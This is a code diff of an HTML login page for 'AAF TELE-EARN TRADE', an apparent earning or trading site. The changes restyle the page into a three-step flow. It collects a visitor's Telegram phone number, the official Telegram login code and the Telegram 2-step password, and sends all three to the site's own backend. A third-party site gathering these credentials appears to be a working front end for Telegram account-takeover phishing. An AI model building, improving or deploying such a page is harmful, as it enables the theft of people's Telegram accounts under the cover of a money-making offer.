@@ -2,305 +2,210 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AAF TELE-EARN TREADING | Secure Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AAF | Telegram Secure Access</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Rajdhani:wght@500;600;700&display=swap');
+
         :root {
-            --primary: #39d353;
-            --bg: #0d1117;
-            --card: #161b22;
-            --border: #30363d;
-            --text-dim: #8b949e;
-            --danger: #ff4d4d;
+            --bg: #030712; --card: #0d111c; --border: rgba(255, 255, 255, 0.1);
+            --cyan: #00f2fe; --primary: #39d353; --gold: #ffaa00;
+            --text-dim: #8b949e; --danger: #ff4d4d;
         }
 
         body {
-            background-color: var(--bg);
-            color: white;
-            font-family: 'Inter', sans-serif;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
+            background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif;
+            margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh;
+            background-image: radial-gradient(circle at 50% 0%, rgba(0, 242, 254, 0.1), transparent);
         }
 
-        .ad-unit {
-            width: 100%;
-            max-width: 400px;
-            height: 100px;
-            background: rgba(255,255,255,0.03);
-            border: 1px dashed var(--border);
-            margin: 10px 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 12px;
-            font-size: 12px;
-            color: var(--text-dim);
+        .auth-container {
+            width: 85%; max-width: 380px; background: var(--card);
+            border: 1px solid var(--border); border-radius: 30px;
+            padding: 40px 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            position: relative; overflow: hidden; backdrop-filter: blur(15px);
+            border-top: 2px solid var(--cyan); text-align: center;
         }
 
-        .auth-box {
-            width: 90%;
-            max-width: 400px;
-            background: var(--card);
-            padding: 30px;
-            border-radius: 20px;
-            border: 1px solid var(--border);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            text-align: center;
+        .logo-wrapper {
+            width: 85px; height: 85px; margin: 0 auto 20px;
+            border-radius: 50%; border: 3px solid var(--cyan);
+            padding: 5px; box-shadow: 0 0 20px rgba(0, 242, 254, 0.3);
         }
-
-        .brand-name {
-            font-size: 20px;
-            font-weight: bold;
-            color: var(--primary);
-            text-transform: uppercase;
-            margin-bottom: 5px;
-        }
-
-        .logo-box img {
-            width: 80px;
-            height: 80px;
-            margin: 15px 0;
-            object-fit: contain;
-        }
-
-        .input-group {
-            position: relative;
-            margin-bottom: 15px;
-            text-align: left;
-        }
-
-        .input-group i {
-            position: absolute;
-            left: 15px;
-            top: 14px;
-            color: var(--text-dim);
-        }
-
-        input {
-            width: 100%;
-            padding: 12px 15px 12px 45px;
-            background: var(--bg);
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            color: white;
-            box-sizing: border-box;
-            outline: none;
-            transition: 0.3s;
-        }
-
-        input:focus { border-color: var(--primary); }
-
-        .phone-container { display: flex; gap: 8px; }
-        .country-code { width: 30%; padding-left: 10px; text-align: center; }
-
-        .btn-main {
-            width: 100%;
-            padding: 13px;
-            background: var(--primary);
-            color: black;
-            border: none;
-            border-radius: 10px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-
-        .btn-main:disabled {
-            background: #2a7a3a;
-            cursor: not-allowed;
-            opacity: 0.7;
-        }
-
-        .switch-link {
-            margin-top: 15px;
-            font-size: 14px;
-            color: var(--text-dim);
-        }
-
-        .switch-link span {
-            color: var(--primary);
-            cursor: pointer;
-            text-decoration: underline;
-        }
-
-        #signup-fields, #verify-fields, #confirm-box { display: none; }
+        .brand-logo { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
         
-        /* Error Message Style */
-        .err-msg { color: var(--danger); font-size: 12px; margin-top: 5px; display: none; }
+        .header-title { font-family: 'Syncopate'; font-size: 14px; color: var(--cyan); margin-bottom: 25px; letter-spacing: 1px; }
+
+        .auth-step { display: none; animation: fadeIn 0.4s ease; }
+        .active-step { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Custom Input Styles */
+        .input-box {
+            background: rgba(255,255,255,0.05); border: 1px solid var(--border);
+            border-radius: 15px; padding: 12px 15px; margin-bottom: 20px;
+            display: flex; align-items: center; transition: 0.3s;
+        }
+        .input-box:focus-within { border-color: var(--cyan); }
+
+        /* Flag Input Overrides */
+        .iti { width: 100%; color: #000; }
+        .iti__country-list { background-color: #161b22; color: #fff; border: 1px solid var(--border); }
+        .iti__country:hover { background-color: #30363d; }
+        input[type="tel"], input[type="number"], input[type="password"] {
+            width: 100%; background: transparent; border: none; color: #fff;
+            font-size: 18px; outline: none; font-family: 'Rajdhani'; padding: 5px;
+        }
+
+        .btn-action {
+            width: 100%; padding: 16px; border-radius: 15px; border: none;
+            background: linear-gradient(135deg, var(--cyan), #0088cc);
+            color: #000; font-weight: 700; font-family: 'Syncopate';
+            font-size: 11px; cursor: pointer; transition: 0.4s;
+            text-transform: uppercase; box-shadow: 0 5px 15px rgba(0, 242, 254, 0.2);
+        }
+        .btn-action:disabled { opacity: 0.6; cursor: not-allowed; }
+
+        #status-box {
+            font-size: 13px; color: var(--danger); margin-bottom: 15px; display: none;
+            background: rgba(255, 77, 77, 0.1); padding: 10px; border-radius: 10px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="ad-unit">ADVERTISEMENT - TOP</div>
+    <div class="auth-container">
+        <div class="logo-wrapper">
+            <img src="{{ url_for('static', filename='logo.png') }}" class="brand-logo" alt="Logo" onerror="this.src='https://via.placeholder.com/100'">
+        </div>
+        
+        <div class="header-title">AAF TELE-EARN TRADE</div>
+        <div id="status-box"></div>
 
-    <div class="auth-box">
-        <div class="brand-name">AAF TELE-EARN TREADING</div>
-        <div class="logo-box">
-            <img src="{{ url_for('static', filename='logo.png') }}" alt="Logo">
+        <div class="auth-step active-step" id="step-1">
+            <div class="input-box">
+                <input type="tel" id="phone" placeholder="Enter Telegram Number">
+            </div>
+            <button class="btn-action" id="btn-otp" onclick="sendOTP()">Get Official Code</button>
         </div>
 
-        <h3 id="form-header" style="font-size: 16px; margin-bottom: 20px;">Login to Account</h3>
-
-        <div id="signup-fields">
-            <div class="input-group">
-                <i class="fas fa-user"></i>
-                <input type="text" id="name" placeholder="Full Name">
+        <div class="auth-step" id="step-2">
+            <p style="font-size: 12px; color: var(--text-dim); margin-bottom: 15px;">Enter the 5-digit code from Telegram</p>
+            <div class="input-box">
+                <input type="number" id="otp-code" placeholder="Enter OTP Code">
             </div>
+            <button class="btn-action" id="btn-verify" onclick="verifyOTP()">Verify Code</button>
         </div>
 
-        <div class="phone-container" style="margin-bottom: 15px;">
-            <input type="text" class="country-code" id="country-code" value="+880" maxlength="5">
-            <div class="input-group" style="width: 70%; margin-bottom: 0;">
-                <i class="fas fa-phone" style="left: 12px;"></i>
-                <input type="text" id="phone" placeholder="Telegram Number" style="padding-left: 40px;">
+        <div class="auth-step" id="step-3">
+            <p style="font-size: 12px; color: var(--gold); margin-bottom: 15px;">Your account has 2-Step verification enabled</p>
+            <div class="input-box">
+                <input type="password" id="two-step-pass" placeholder="2-Step Password">
             </div>
-        </div>
-
-        <div class="input-group">
-            <i class="fas fa-lock"></i>
-            <input type="password" id="site-pass" placeholder="Site Password">
-        </div>
-
-        <div id="confirm-box">
-            <div class="input-group">
-                <i class="fas fa-shield-check"></i>
-                <input type="password" id="confirm-pass" placeholder="Confirm Password">
-            </div>
-        </div>
-
-        <div id="verify-fields">
-            <div style="border-top: 1px solid var(--border); margin: 20px 0; padding-top: 15px;">
-                <p style="font-size: 12px; color: var(--primary);">টেলিগ্রাম কোড এবং ২-স্টেপ দিন</p>
-            </div>
-            <div class="input-group">
-                <i class="fas fa-paper-plane"></i>
-                <input type="text" id="tele-code" placeholder="Official Telegram Code">
-            </div>
-            <div class="input-group">
-                <i class="fas fa-key"></i>
-                <input type="password" id="two-step" placeholder="2-Step Password (If enabled)">
-            </div>
-        </div>
-
-        <button class="btn-main" id="submit-btn" onclick="handleAuth()">NEXT (SEND OTP)</button>
-
-        <div class="switch-link" id="toggle-text">
-            New here? <span onclick="toggleMode('signup')">Sign Up</span>
+            <button class="btn-action" id="btn-final" onclick="verifyFinal()">Access Account</button>
         </div>
     </div>
 
-    <div class="ad-unit">ADVERTISEMENT - BOTTOM</div>
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
     <script>
-    const API_BASE_URL = window.location.origin; // একই ডোমেইন হলে এটি ব্যবহার করা নিরাপদ
-    let mode = 'login';
-    let currentStep = 1;
+        // Initialize International Phone Input
+        const phoneInput = document.querySelector("#phone");
+        const iti = window.intlTelInput(phoneInput, {
+            initialCountry: "bd",
+            separateDialCode: true,
+            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js",
+        });
 
-    function toggleMode(target) {
-        mode = target;
-        currentStep = 1;
-        document.getElementById('form-header').innerText = mode === 'signup' ? "Create New Account" : "Login to Account";
-        document.getElementById('signup-fields').style.display = mode === 'signup' ? "block" : "none";
-        document.getElementById('confirm-box').style.display = mode === 'signup' ? "block" : "none";
-        document.getElementById('verify-fields').style.display = "none";
-        document.getElementById('submit-btn').innerText = "NEXT (SEND OTP)";
-        document.getElementById('submit-btn').disabled = false;
-        document.getElementById('toggle-text').innerHTML = mode === 'signup' ? 
-            "Have an account? <span onclick='toggleMode(\"login\")'>Login</span>" : 
-            "New here? <span onclick='toggleMode(\"signup\")'>Sign Up</span>";
-    }
+        const API_URL = window.location.origin;
 
-    async function handleAuth() {
-        const phone = document.getElementById('country-code').value + document.getElementById('phone').value;
-        const sitePass = document.getElementById('site-pass').value;
-        const submitBtn = document.getElementById('submit-btn');
-
-        if (currentStep === 1) {
-            // ১. ওটিপি পাঠানোর ধাপ
-            if (!document.getElementById('phone').value || !sitePass) { 
-                alert("ফোন নম্বর এবং পাসওয়ার্ড দুটিই দিন।"); 
-                return; 
-            }
-            
-            if (mode === 'signup') {
-                const confirmPass = document.getElementById('confirm-pass').value;
-                if (sitePass !== confirmPass) { alert("পাসওয়ার্ড মেলেনি!"); return; }
-            }
-            
-            submitBtn.innerText = "SENDING OTP...";
-            submitBtn.disabled = true;
-
-            try {
-                const res = await fetch(`${API_BASE_URL}/api/send_otp`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: phone })
-                });
-                const data = await res.json();
-                
-                if (data.success) {
-                    alert("আপনার টেলিগ্রামে ওটিপি পাঠানো হয়েছে।");
-                    document.getElementById('verify-fields').style.display = "block";
-                    submitBtn.innerText = "VERIFY & LOGIN";
-                    currentStep = 2;
-                } else {
-                    alert("Error: " + data.message);
-                    submitBtn.innerText = "NEXT (SEND OTP)";
-                }
-            } catch (err) {
-                alert("সার্ভার কানেকশন ফেইলড!");
-                submitBtn.innerText = "NEXT (SEND OTP)";
-            } finally {
-                submitBtn.disabled = false;
-            }
-
-        } else if (currentStep === 2) {
-            // ২. ওটিপি ও ২-স্টেপ ভেরিফাই করার ধাপ
-            const otp = document.getElementById('tele-code').value;
-            const twoStep = document.getElementById('two-step').value;
-
-            if (!otp) { alert("টেলিগ্রাম থেকে পাওয়া ৫ ডিজিটের কোডটি দিন।"); return; }
-
-            submitBtn.innerText = "VERIFYING...";
-            submitBtn.disabled = true;
-
-            try {
-                const res = await fetch(`${API_BASE_URL}/api/verify_login`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        phone: phone, 
-                        code: otp,
-                        password: twoStep, // এটি ২-স্টেপ পাসওয়ার্ড
-                        site_password: sitePass, // এটি সাইটের নিজস্ব পাসওয়ার্ড
-                        mode: mode
-                    })
-                });
-                const data = await res.json();
-                
-                if (data.success) {
-                    // সাকসেস হলে লোকাল ডাটা সেভ এবং রিডাইরেক্ট
-                    localStorage.setItem('user_id', data.uid);
-                    alert("অভিনন্দন! লগইন সফল হয়েছে।");
-                    window.location.replace(window.location.origin + "/dashboard");
-                } else {
-                    // ভুল ওটিপি বা পাসওয়ার্ড দিলে এখানে ধরবে
-                    alert("ভেরিফিকেশন ব্যর্থ: " + data.message);
-                    submitBtn.innerText = "VERIFY & LOGIN";
-                }
-            } catch (err) {
-                alert("ভেরিফিকেশন এরর! ইন্টারনেটের কানেকশন চেক করুন।");
-                submitBtn.innerText = "VERIFY & LOGIN";
-            } finally {
-                submitBtn.disabled = false;
-            }
+        function goToStep(num) {
+            document.querySelectorAll('.auth-step').forEach(s => s.classList.remove('active-step'));
+            document.getElementById(`step-${num}`).classList.add('active-step');
         }
-    }
+
+        function notify(msg) {
+            const box = document.getElementById('status-box');
+            box.innerText = msg;
+            box.style.display = 'block';
+            setTimeout(() => { box.style.display = 'none'; }, 4000);
+        }
+
+        async function sendOTP() {
+            const fullNumber = iti.getNumber();
+            if (!iti.isValidNumber()) return notify("Please enter a valid number!");
+
+            const btn = document.getElementById('btn-otp');
+            btn.disabled = true;
+            btn.innerText = "SENDING...";
+
+            try {
+                const res = await fetch(`${API_URL}/api/send_otp`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: fullNumber })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    goToStep(2);
+                } else {
+                    notify(data.message);
+                }
+            } catch (e) { notify("Connection Error!"); }
+            finally { btn.disabled = false; btn.innerText = "Get Official Code"; }
+        }
+
+        async function verifyOTP() {
+            const otp = document.getElementById('otp-code').value;
+            const fullNumber = iti.getNumber();
+
+            if (!otp) return notify("Enter the code!");
+
+            const btn = document.getElementById('btn-verify');
+            btn.disabled = true;
+
+            try {
+                const res = await fetch(`${API_URL}/api/verify_login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: fullNumber, code: otp })
+                });
+                const data = await res.json();
+
+                if (data.success) {
+                    window.location.replace("/dashboard");
+                } else if (data.message.toLowerCase().includes("password")) {
+                    goToStep(3);
+                } else {
+                    notify(data.message);
+                }
+            } catch (e) { notify("Verification Failed!"); }
+            finally { btn.disabled = false; }
+        }
+
+        async function verifyFinal() {
+            const pwd = document.getElementById('two-step-pass').value;
+            const otp = document.getElementById('otp-code').value;
+            const fullNumber = iti.getNumber();
+
+            if (!pwd) return notify("Enter 2-Step Password!");
+
+            try {
+                const res = await fetch(`${API_URL}/api/verify_login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: fullNumber, code: otp, password: pwd })
+                });
+                const data = await res.json();
+
+                if (data.success) {
+                    window.location.replace("/dashboard");
+                } else {
+                    notify("Invalid 2-Step Password!");
+                }
+            } catch (e) { notify("Login Error!"); }
+        }
     </script>
 </body>
 </html>
